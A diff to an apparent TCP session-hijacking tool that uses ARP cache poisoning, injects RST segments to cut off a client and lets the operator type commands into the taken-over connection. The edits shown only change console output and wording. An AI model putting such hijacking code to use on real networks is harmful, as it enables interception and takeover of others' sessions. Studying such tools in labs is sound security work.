@@ -77,9 +77,9 @@ def cut_off_client(if_name, client_ip, server_ip, client_port, server_port,
     ip_handler.send(rst_seg)
 
 def print_seg(tcp_seg):
-    seg_str = f'{tcp_seg.src_port}->{tcp_seg.dst_port} '
+    seg_str = f'\r{tcp_seg.src_port}->{tcp_seg.dst_port} '
     seg_str += f'seq {tcp_seg.seq_nr} ack {tcp_seg.ack_nr} '
-    seg_str += f'len {tcp_seg.length} flags {tcp_seg.get_flag_str()}'
+    seg_str += f'len {tcp_seg.length} flags {tcp_seg.get_flag_str():<30}'
     tools.print_rgb(seg_str, (100, 150, 100), bold=False)
 
 # validate parameters and initialize variables
@@ -216,8 +216,8 @@ try:
                     hijacked = True
                     tools.print_rgb('connection hijacked!',
                             rgb=(200, 150, 100), bold=True)
-                    tools.print_rgb('type some commands...\n\n',
-                            rgb=(100, 100, 100), bold=False)
+                    tools.print_rgb('type some command: ',
+                            rgb=(100, 100, 100), bold=False, end='')
                     new_tty_attr[3] |= termios.ECHO
                     termios.tcsetattr(sys.stdin, termios.TCSANOW, new_tty_attr)
         if hijacked:
@@ -228,8 +228,8 @@ finally:
     termios.tcsetattr(sys.stdin, termios.TCSADRAIN, term_attr)
     if hijacked:
         tcp_handler.close()
-    tools.print_rgb('\n\nstopping ARP spoofing...',
-            rgb=(200, 0, 0), bold=True, end='')
+    tools.print_rgb('\n\nstopping ARP cache poisoning...',
+            rgb=(200, 150, 100), bold=True, end='')
     arp_data_client = {'operation': 2,
             'src_addr': my_mac,
             'dst_addr': client_mac,
